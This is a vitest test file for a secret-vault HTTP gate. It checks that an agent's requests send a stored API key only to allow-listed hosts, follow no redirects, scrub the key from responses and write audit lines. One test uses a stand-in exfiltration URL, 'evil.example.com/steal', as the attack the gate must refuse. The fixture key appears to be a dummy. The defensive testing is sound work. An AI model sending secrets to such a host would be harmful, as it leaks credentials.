import { describe, expect, it } from "vitest";
import type { VaultKey } from "@realm/contracts";
import { performVaultHttp, scrubSecret, type VaultHttpDeps, type VaultHttpRequest } from "./vault-http";
import type { VaultHttpAuditEntry } from "./secret-store";

/**
 * `vault_http`'s far side. The mutants:
 *   - a host the key is not locked to (or the grant does not name) reaching the network, or the prompt;
 *   - the key substituted into the URL, or anywhere the agent did not write the placeholder;
 *   - a redirect followed to a host the gate never saw;
 *   - the value coming back in the response in any ordinary spelling;
 *   - an audit line carrying the value, or none at all.
 */

const VALUE = "sk_live_7f3a9c2e1b8d4f60";
const KEY: VaultKey = { id: "k1", name: "REVENUECAT_SECRET_KEY", label: "", allowedHosts: ["api.revenuecat.com", "127.0.0.1:8815"], spaceId: "S", createdAt: 1 };

type Call = { url: string; init: RequestInit };

function harness(respond: (c: Call) => Response = () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } }), presence = true) {
  const calls: Call[] = [];
  const audit: VaultHttpAuditEntry[] = [];
  const opened: string[] = [];
  const deps: VaultHttpDeps = {
    keys: {
      getKey: (_p, _s, id) => (id === KEY.id ? KEY : null),
      withKeyValue: async (_p, _s, id, use) => {
        opened.push(id);
        if (!presence) return { ok: false, refused: "no_presence" };
        await use(VALUE, KEY);
        return { ok: true };
      },
    },
    fetch: (async (url: string, init: RequestInit) => { const c = { url, init }; calls.push(c); return respond(c); }) as unknown as typeof fetch,
    audit: (e) => { audit.push(e); },
    now: () => 9,
  };
  return { deps, calls, audit, opened };
}

const req = (over: Partial<VaultHttpRequest> = {}): VaultHttpRequest => ({
  profileId: "P", spaceId: "S", secretId: "k1", hosts: null, method: "GET",
  url: "https://api.revenuecat.com/v1/subscribers/1", headers: { Authorization: "Bearer {{secret}}" }, body: null, ...over,
});

describe("performVaultHttp — the gate", () => {
  it("refuses a host the key is not locked to before anything is opened or sent", async () => {
    const h = harness();
    const r = await performVaultHttp(h.deps, req({ url: "https://evil.example.com/steal" }));
    expect(r).toEqual({ ok: false, refused: "host", error: "REVENUECAT_SECRET_KEY is locked to api.revenuecat.com, 127.0.0.1:8815, not evil.example.com" });
    expect(h.opened).toEqual([]);
    expect(h.calls).toEqual([]);
    expect(h.audit).toEqual([{ ts: 9, kind: "vault-http", secretId: "k1", host: "evil.example.com", method: "GET", outcome: "host_refused", spaceId: "S" }]);
  });

  it("refuses a host the key allows but the role's grant does not name", async () => {
    const h = harness();
    const r = await performVaultHttp(h.deps, req({ hosts: ["127.0.0.1:8815"] }));
    expect(r.ok).toBe(false);
    expect(h.opened).toEqual([]);
  });

  it("refuses a suffix of an allowed host, plain http off this Mac, and the placeholder in the URL", async () => {
    const h = harness();
    expect((await performVaultHttp(h.deps, req({ url: "https://x.api.revenuecat.com/" }))).ok).toBe(false);
    expect((await performVaultHttp(h.deps, req({ url: "http://api.revenuecat.com/" }))).ok).toBe(false);
    expect((await performVaultHttp(h.deps, req({ url: "https://api.revenuecat.com/?k={{secret}}" }))).ok).toBe(false);
    expect(h.calls).toEqual([]);
  });

  it("asks for the placeholder rather than sending a request with no key in it", async () => {
    const h = harness();
    const r = await performVaultHttp(h.deps, req({ headers: { Accept: "application/json" } }));
    expect(r).toMatchObject({ ok: false, refused: "error" });
    expect(h.opened).toEqual([]);
  });

  it("sends nothing when nobody confirms on this Mac", async () => {
    const h = harness(undefined, false);
    expect(await performVaultHttp(h.deps, req())).toMatchObject({ ok: false, refused: "no_presence" });
    expect(h.calls).toEqual([]);
    expect(h.audit.at(-1)?.outcome).toBe("no_presence");
  });
});

describe("performVaultHttp — the request", () => {
  it("puts the key only where the placeholder stood, and follows no redirect", async () => {
    const h = harness();
    await performVaultHttp(h.deps, req({ method: "POST", url: "http://127.0.0.1:8815/echo", headers: { Authorization: "Bearer {{secret}}", "X-Note": "plain" }, body: '{"k":"{{secret}}"}' }));
    expect(h.calls).toHaveLength(1);
    const c = h.calls[0]!;
    expect(c.url).toBe("http://127.0.0.1:8815/echo");
    expect(c.init.headers).toEqual({ Authorization: `Bearer ${VALUE}`, "X-Note": "plain" });
    expect(c.init.body).toBe(`{"k":"${VALUE}"}`);
    expect(c.init.redirect).toBe("manual");
  });

  it("hands back a redirect's status and where it points, unfollowed", async () => {
    const h = harness(() => new Response(null, { status: 302, headers: { location: "https://elsewhere.example/" } }));
    const r = await performVaultHttp(h.deps, req());
    expect(r).toMatchObject({ ok: true, status: 302, location: "https://elsewhere.example/" });
    expect(h.calls).toHaveLength(1);
  });

  it("scrubs the value from the answer in every ordinary spelling", async () => {
    const echo = [
      VALUE, encodeURIComponent(VALUE), Buffer.from(VALUE).toString("base64"), Buffer.from(VALUE).toString("base64url"),
      Buffer.from(VALUE).toString("hex"), Buffer.from(VALUE).toString("hex").toUpperCase(), JSON.stringify(`Bearer ${VALUE}`),
    ].join("\n");
    const h = harness(() => new Response(echo, { status: 401, headers: { location: `https://api.revenuecat.com/?t=${VALUE}` } }));
    const r = await performVaultHttp(h.deps, req());
    expect(r.ok).toBe(true);
    const text = JSON.stringify(r);
    expect(text).not.toContain(VALUE);
    for (const enc of ["base64", "base64url", "hex"] as const) expect(text).not.toContain(Buffer.from(VALUE).toString(enc));
    expect(text).not.toContain(Buffer.from(VALUE).toString("hex").toUpperCase());
    expect(text).toContain("[redacted]");
  });

  it("writes one audit line per use, with the role and the status and never the value", async () => {
    const h = harness();
    await performVaultHttp(h.deps, req({ roleId: "R1", runId: "run1" }));
    expect(h.audit).toEqual([{ ts: 9, kind: "vault-http", secretId: "k1", host: "api.revenuecat.com", method: "GET", outcome: "used", status: 200, spaceId: "S", roleId: "R1", runId: "run1" }]);
    expect(JSON.stringify(h.audit)).not.toContain(VALUE);
  });

  it("reports a network failure by its cause, scrubbed", async () => {
    const h = harness(() => { throw Object.assign(new TypeError(`fetch failed for ${VALUE}`), { cause: { code: "ECONNREFUSED" } }); });
    const r = await performVaultHttp(h.deps, req());
    expect(r).toEqual({ ok: false, refused: "error", error: "the request to api.revenuecat.com failed: ECONNREFUSED" });
  });
});

describe("scrubSecret", () => {
  it("replaces the longest form whole before a shorter one inside it", () => {
    expect(scrubSecret(`a ${Buffer.from(VALUE).toString("hex")} b`, VALUE)).toBe("a [redacted] b");
  });
});
